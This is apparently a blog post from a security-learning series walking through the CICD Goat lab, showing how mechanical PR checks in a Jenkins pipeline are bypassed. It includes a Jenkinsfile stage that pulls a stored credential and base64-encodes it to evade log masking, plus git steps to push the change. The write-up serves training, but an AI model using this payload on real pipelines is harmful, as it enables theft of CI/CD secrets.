---
title: '100 Days of Cloud Security - Day 87: CICD Goat - Insufficient Flow Control Mechanism'
date: '2026-02-05'
author: 'Venkata Pathuri'
excerpt: 'Day 87 of my cloud security journey - CICD Goat - Insufficient Flow Control Mechanism'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 87: CICD Goat - Insufficient Flow Control Mechanism

## Overview
Welcome back to Day 87 of our cloud security journey! Today, we dive into a fascinating challenge called **CICD Goat - Insufficient Flow Control Mechanism**. This topic builds on our previous discussions about CI/CD pipelines, where we learned about potential vulnerabilities and their impact on security. Now, we're going to explore how insufficient flow control mechanisms can lead to severe security risks, especially in a CI/CD environment.

## Learning Objectives
By the end of today’s session, you will master the ins and outs of CI/CD workflow vulnerabilities. You will learn how to exploit insufficient controls in a hypothetical scenario, gaining insights into how these vulnerabilities can be mitigated in real-world applications. Moreover, you’ll grasp the importance of maintaining strict flow controls in your CI/CD processes to protect sensitive information and ensure the integrity of your deployments.

## Deep Dive
### The Concept of Insufficient Flow Control Mechanism
In a typical CI/CD workflow, various checks and balances are in place to ensure that code changes are safe before they are merged into the main branch. Today, our focus will be on a specific set of constraints that, if not properly implemented, can lead to unauthorized access and exploitation.

#### The Three Constraints
1. **The Zero-Sum Word Count**
   - The CI/CD system checks for the total words added and removed in a Pull Request (PR).
   - **Rule:** The net change must equal zero. This means any additions must be counterbalanced by deletions.

2. **Version File Formatting**
   - A `version` file must exist and adhere to a specific format (e.g., semantic versioning).
   - **Rule:** The version must follow a regex pattern like `1.0.0`.

3. **Mandatory Version Update**
   - The `version` file must be modified with every PR.
   - **Rule:** A valid PR cannot be submitted without changing the version number.

### The Vulnerability
The crux of the vulnerability lies in the mechanical nature of these constraints. They can be manipulated without a true understanding of the code being executed. This means that a malicious actor can craft a PR that satisfies all constraints while still introducing harmful code.

### Execution Strategy (Walkthrough)
Let's break down the exploitation process step-by-step:

#### Step 1: Craft the Payload
To extract a sensitive secret stored in Jenkins' credential store, we can inject a Groovy script into the `Jenkinsfile`. Here’s a simple payload that retrieves a credential and prints it in a way that circumvents log masking:

```groovy
pipeline {
    agent any
    stages {
        stage('Exfiltrate') {
            steps {
                withCredentials([usernamePassword(credentialsId: 'flag10', usernameVariable: 'USERNAME', passwordVariable: 'TOKEN')]) {
                    // Echo the token encoded in base64 to bypass log masking
                    sh 'echo $TOKEN | base64'
                }
            }
        }
    }
}
```

#### Step 2: Balance the Word Count
Next, we need to ensure that our changes equalize in terms of word count.

1. **Calculate the Payload:** Count the words in the payload above. It contains 41 words.
2. **Modify `README.md`:** Open the `README.md` file and remove 41 words. This could involve deleting non-essential comments or notes.

#### Step 3: Update the Version
1. Open the `version` file.
2. Increment the version (e.g., change `1.0.1` to `1.0.2`), ensuring it still complies with the semantic versioning format.

#### Step 4: Push and Retrieve
1. Commit your changes to a new branch.
2. Push the branch to the repository. This should trigger the Jenkins pipeline.
3. Once the pipeline executes, check the Jenkins console output for the base64 encoded token.
4. Decode the string to capture the `flag10` secret.

## Hands-On Practice
### Command Steps
1. **Clone the repository:**
   ```bash
   git clone https://github.com/example/mock-turtle.git
   cd mock-turtle
   ```

2. **Create a new branch:**
   ```bash
   git checkout -b exploit-branch
   ```

3. **Edit the `Jenkinsfile` and `README.md`:**
   - Add the payload to the `Jenkinsfile`.
   - Remove the equivalent number of words from `README.md`.

4. **Update the version:**
   - Modify the `version` file.

5. **Commit and push:**
   ```bash
   git add Jenkinsfile README.md version
   git commit -m "Exploiting insufficient flow control"
   git push origin exploit-branch
   ```

### Expected Outcomes
Upon pushing, the Jenkins pipeline should execute successfully, merging your PR and running the injected malicious code. You should see the base64 encoded token in the Jenkins console output.

### Common Troubleshooting Tips
- Ensure that your word count matches exactly when modifying files.
- Double-check the versioning format to avoid regex validation issues.
- Review the Jenkins logs for any errors or unexpected behavior.

## Key Takeaways
In today’s challenge, we learned how insufficient flow control can be exploited within CI/CD pipelines. By understanding the mechanics of these vulnerabilities, you can better implement security measures that protect sensitive data and maintain the integrity of your deployment processes. Remember, it's not just about what checks are in place but how effectively they are enforced.

## Real-World Applications
In production environments, the lessons learned here are crucial. Organizations must ensure that their CI/CD pipelines have robust security measures to prevent unauthorized code changes. This includes implementing comprehensive code reviews, automated security testing, and regular audits of CI/CD processes to identify and mitigate potential vulnerabilities.

---
**Journey Progress:** 87/100 Days Complete 🚀